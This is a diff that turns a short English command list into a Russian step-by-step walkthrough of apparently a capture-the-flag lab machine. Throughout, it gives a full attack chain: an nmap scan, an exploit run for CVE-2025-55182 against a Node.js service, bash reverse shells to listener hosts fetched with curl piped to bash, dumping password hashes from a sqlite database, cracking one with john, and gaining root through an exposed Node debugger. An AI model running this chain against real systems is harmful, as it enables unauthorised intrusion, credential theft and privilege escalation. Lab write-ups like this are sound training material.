@@ -1,22 +1,41 @@
-1. sudo nmap -Pn -sC -sV <IP>
-2. Download CVE-2025-55182 Exploit DB
-3. sudo python3 CVE-2025-55182.py -t http://10.129.101.31:3000 -c "id"
-4. echo 'bash -i >& /dev/tcp/your-IP/9001 0>&1' > s.sh
-5. python3 -m http.server 80
-6. sudo nc -lvnp 9002
-7. sudo python3 CVE-2025-55182.py -t http://10.129.101.31:3000 -c "curl http://10.10.15.47/s.sh|bash"
+1. Сканирование фдреса машины sudo nmap -Pn -sC -sV <IP машины>
+   открытые порты: 22 и 3000
+   В выводе nmap вы должны увидеть что 3000 порт слушает Node js
+   Узнайте версию Node js
+   
+2. В Exploit DB найдите и скачайте уязвимость Node js CVE-2025-55182
 
-8. sqlite3 reactor.db
-9. .tables
-10. SELECT * FROM users;
-11. echo '39d97110eafe2a9a68639812cd271e8e' > engineer_hash.txt
-12. john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 engineer_hash.txt
-13. su - engineer
-    password: reactor1
-14. cat user.txt
-15. ss -tunlp
-    127.0.0.1:9229
-16. node inspect 127.0.0.1:9229
-17. in your console - nc -nlvp 9002
-18. in debug console: exec("process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.15.120/9002 0>&1\"').toString()")
-19. cat root/root.txt
+3. Откройте папку в которой вы сохранили CVE-2025-55182 и запустите sudo python3 CVE-2025-55182.py -t http://10.129.101.31:3000 -c "id"
+
+4. В отдельной папке сохраните echo 'bash -i >& /dev/tcp/your-IP/9001 0>&1' > s.sh
+   И в той же директории запустите свой локальный сервер который будет раздавать s.sh: python3 -m http.server 80
+   
+8. Откройе отдельное окно в терминате и запустите netcat: sudo nc -lvnp 9002
+   
+10. В консоли где вы запускали эксплойт повторите команду но вместо "id" введите "curl http://10.10.15.47/s.sh|bash" уязвимый сервер свяжется с вашим локальным сервером  на 80 порту и выполнит команду из s.sh
+
+11. В терминале с nc -lvnp 9002 у вас появится удалённый доступ к серверу node js
+    Найдите папку reactor.db
+    Если вы её нашли то запустите sqlite3 reactor.db
+    Затем   .tables
+    SELECT * FROM users;
+
+Вы увидете хэши паролей админа и инжинера, скоппируйте хэш инженера и сохраите его у себя echo '39d97110eafe2a9a68639812cd271e8e' > engineer_hash.txt
+Для перебора пароля используйте john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 engineer_hash.txt
+В косоли node js введите su - engineer чтобы перейти к учётной записи инжинера
+у вас запросят пароль, введите то что вывел вам john (reactor1)
+
+18. Поздравляю, теперь вы инженер, найдите файл cat user.txt
+    Первый флаг найден.
+    
+20. в той же консоли узнайте о сетевых соединениях ss -tunlp
+    Вы заметите осединение 127.0.0.1:9229 это дебагер node js
+    
+20. для получения доступа к дебаг-консоли node inspect 127.0.0.1:9229
+22. Перейдите в свою консоль и в новом окне запустите nc -nlvp 9002
+
+24. В дебаг консоли запустите exec("process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.15.120/9002 0>&1\"').toString()")
+
+26. Если всё прошло успешно перейдите в консоль где запустили nc, вы получите доступ root
+27. Найдите файл cat root/root.txt
+Поздравляю, второй флаг найден
